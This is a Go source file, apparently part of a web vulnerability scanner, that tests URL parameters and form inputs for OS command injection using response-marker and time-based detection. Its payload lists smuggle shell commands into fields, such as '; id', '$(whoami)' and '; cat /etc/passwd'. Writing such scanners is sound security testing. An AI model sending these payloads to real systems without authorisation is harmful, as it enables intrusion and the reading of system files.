package modules

import (
	"fmt"
	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// cmdiResponsePayload pairs an injection string with the stdout markers we
// expect to see reflected back in the HTTP response body.
type cmdiResponsePayload struct {
	Payload string
	Markers []string
}

var cmdiResponsePayloads = []cmdiResponsePayload{
	// id/whoami - most reliable
	{"; id", []string{"uid=", "gid=", "groups="}},
	{"| id", []string{"uid=", "gid=", "groups="}},
	{"$(id)", []string{"uid=", "gid=", "groups="}},
	{"`id`", []string{"uid=", "gid=", "groups="}},
	{"&& id", []string{"uid=", "gid=", "groups="}},
	{"; whoami", []string{"root", "www-data", "apache", "nginx", "nobody", "daemon"}},
	{"| whoami", []string{"root", "www-data", "apache", "nginx", "nobody", "daemon"}},
	{"$(whoami)", []string{"root", "www-data", "apache", "nginx", "nobody", "daemon"}},
	// /etc/passwd leak
	{"; cat /etc/passwd", []string{"root:x:", "nobody:x:", "/bin/bash", "/bin/sh", "/sbin/nologin"}},
	{"| cat /etc/passwd", []string{"root:x:", "nobody:x:", "/bin/bash", "/bin/sh", "/sbin/nologin"}},
	// Windows
	{"& whoami", []string{"nt authority\\", "system32", "administrator"}},
	{"| type C:\\Windows\\win.ini", []string{"[fonts]", "[extensions]", "[mci extensions]"}},
}

type cmdiTimedPayload struct {
	Payload string
	Sleep   int
	OS      string
}

var cmdiTimedPayloads = []cmdiTimedPayload{
	{"; sleep 4", 4, "Unix"},
	{"| sleep 4", 4, "Unix"},
	{"$(sleep 4)", 4, "Unix"},
	{"`sleep 4`", 4, "Unix"},
	{"&& sleep 4", 4, "Unix"},
	{"; ping -c 4 127.0.0.1", 4, "Unix"},
	{"& timeout /T 4 /NOBREAK", 4, "Windows"},
	{"| timeout /T 4 /NOBREAK", 4, "Windows"},
}

// ScanCmdInjection tests URL params and form inputs for OS command injection.
// It tries response-based detection first (faster), then falls back to
// time-based detection to catch blind injection.
func ScanCmdInjection(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	// ── URL parameters ─────────────────────────────────────────────────────
	var params url.Values
	p, err := url.Parse(target.URL)
	if err == nil {
		params, _ = url.ParseQuery(p.RawQuery)
	} else {
		params = url.Values{}
	}

	for param := range params {
		if cfg.Verbose {
			output.Verbose("[cmdi-get] param=%s", param)
		}
		baseline, _, err := core.DoGET(client, cfg, target.URL)
		if err != nil || baseline == "" {
			continue
		}

		// Response-based
	CMDiURLResp:
		for _, pl := range cmdiResponsePayloads {
			testURL, err := core.SetParam(target.URL, param, pl.Payload)
			if err != nil {
				continue
			}
			body, status, err := core.DoGET(client, cfg, testURL)
			if err != nil {
				continue
			}
			for _, marker := range pl.Markers {
				if strings.Contains(body, marker) && !strings.Contains(baseline, marker) {
					results = append(results, core.ScanResult{
						Type: "Command Injection",
						URL:  testURL, Method: "GET", Parameter: param,
						Payload: pl.Payload, Severity: "CRITICAL",
						Evidence:  fmt.Sprintf("marker %q reflected in response (HTTP %d)", marker, status),
						Timestamp: time.Now(),
					})
					break CMDiURLResp
				}
			}
		}

		// Time-based (blind) — only if no response-based hit
		if !containsResultForParam(results, "Command Injection", target.URL, param) {
			// Establish timing baseline to avoid false positives on slow servers
			tb0 := time.Now()
			core.DoGET(client, cfg, target.URL) //nolint:errcheck
			baseTime := time.Since(tb0)

		CMDiURLTime:
			for _, pl := range cmdiTimedPayloads {
				testURL, err := core.SetParam(target.URL, param, pl.Payload)
				if err != nil {
					continue
				}
				t0 := time.Now()
				_, status, err := core.DoGET(client, cfg, testURL)
				elapsed := time.Since(t0)
				if err != nil {
					continue
				}
				threshold := baseTime + time.Duration(pl.Sleep-1)*time.Second
				if elapsed >= threshold {
					results = append(results, core.ScanResult{
						Type: "Command Injection (Blind/Time-Based)",
						URL:  testURL, Method: "GET", Parameter: param,
						Payload: pl.Payload, Severity: "CRITICAL",
						Evidence:  fmt.Sprintf("delay %v >= threshold %v [%s] HTTP=%d", elapsed.Round(time.Millisecond), threshold, pl.OS, status),
						Timestamp: time.Now(),
					})
					output.VulnInline("CMDI-BLIND", "GET param=%s delay=%v\n", param, elapsed.Round(time.Millisecond))
					break CMDiURLTime
				}
			}
		}
	}

	// ── Forms ──────────────────────────────────────────────────────────────
	for _, form := range target.Forms {
		// Fetch baseline once per form, not per input — avoids redundant requests.
		var baseline string
		var baseErr error
		if form.Method == "POST" {
			baseline, _, baseErr = core.DoPOST(client, cfg, form.Action, core.FormDefaults(form))
		} else {
			baseline, _, baseErr = core.DoGET(client, cfg, form.Action)
		}
		if baseErr != nil || baseline == "" {
			continue
		}
		for _, inp := range form.Inputs {
			if cfg.Verbose {
				output.Verbose("[cmdi-form] %s %s input=%s\n", form.Method, form.Action, inp.Name)
			}

			// Response-based
		CMDiFormResp:
			for _, pl := range cmdiResponsePayloads {
				var body string
				var status int
				var err error
				if form.Method == "POST" {
					d := core.FormDefaults(form)
					d.Set(inp.Name, pl.Payload)
					body, status, err = core.DoPOST(client, cfg, form.Action, d)
				} else {
					d := core.FormDefaults(form)
					d.Set(inp.Name, pl.Payload)
					u, _ := core.SetFormParams(form.Action, d)
					body, status, err = core.DoGET(client, cfg, u)
				}
				if err != nil {
					continue
				}
				for _, marker := range pl.Markers {
					if strings.Contains(body, marker) && !strings.Contains(baseline, marker) {
						results = append(results, core.ScanResult{
							Type: "Command Injection via core.Form",
							URL:  form.Action, Method: form.Method, Parameter: inp.Name,
							Payload: pl.Payload, Severity: "CRITICAL",
							Evidence:  fmt.Sprintf("marker %q reflected in response (HTTP %d)", marker, status),
							Timestamp: time.Now(),
						})
						break CMDiFormResp
					}
				}
			}

			// Time-based (blind)
			if !containsResultForInput(results, "Command Injection", form.Action, inp.Name) {
				// Establish timing baseline to avoid false positives on slow servers
				tb0 := time.Now()
				if form.Method == "POST" {
					core.DoPOST(client, cfg, form.Action, core.FormDefaults(form)) //nolint:errcheck
				} else {
					core.DoGET(client, cfg, form.Action) //nolint:errcheck
				}
				baseTime := time.Since(tb0)

			CMDiFormTime:
				for _, pl := range cmdiTimedPayloads {
					t0 := time.Now()
					var status int
					var err error
					if form.Method == "POST" {
						d := core.FormDefaults(form)
						d.Set(inp.Name, pl.Payload)
						_, status, err = core.DoPOST(client, cfg, form.Action, d)
					} else {
						d := core.FormDefaults(form)
						d.Set(inp.Name, pl.Payload)
						u, _ := core.SetFormParams(form.Action, d)
						_, status, err = core.DoGET(client, cfg, u)
					}
					elapsed := time.Since(t0)
					if err != nil {
						continue
					}
					threshold := baseTime + time.Duration(pl.Sleep-1)*time.Second
					if elapsed >= threshold {
						results = append(results, core.ScanResult{
							Type: "Command Injection via core.Form (Blind/Time-Based)",
							URL:  form.Action, Method: form.Method, Parameter: inp.Name,
							Payload: pl.Payload, Severity: "CRITICAL",
							Evidence:  fmt.Sprintf("delay %v >= threshold %v [%s] HTTP=%d", elapsed.Round(time.Millisecond), threshold, pl.OS, status),
							Timestamp: time.Now(),
						})
						output.VulnInline("CMDI-FORM-BLIND", "%s %s input=%s delay=%v\n", form.Method, form.Action, inp.Name, elapsed.Round(time.Millisecond))
						break CMDiFormTime
					}
				}
			}
		}
	}

	return results
}

// containsResultForParam checks if a result already exists for a given
// injection type / parameter combo (avoids duplicate time-based hits
// when response-based already fired).
// It normalises both the stored URL and rawURL by stripping query strings
// so that payload-injected test URLs still match the original target.
func containsResultForParam(results []core.ScanResult, typ, rawURL, param string) bool {
	want := core.StripQuery(rawURL)
	for _, r := range results {
		if r.Parameter == param && strings.HasPrefix(r.Type, typ) && core.StripQuery(r.URL) == want {
			return true
		}
	}
	return false
}

// stripQuery removes the query string and fragment from a URL, returning
// just the scheme + host + path. This is used to normalise URLs for
// comparison so that payload-injected variants still match the original.
// MOVED TO CORE: StripQuery

func containsResultForInput(results []core.ScanResult, typ, action, input string) bool {
	for _, r := range results {
		if r.Parameter == input && r.URL == action && strings.HasPrefix(r.Type, typ) {
			return true
		}
	}
	return false
}
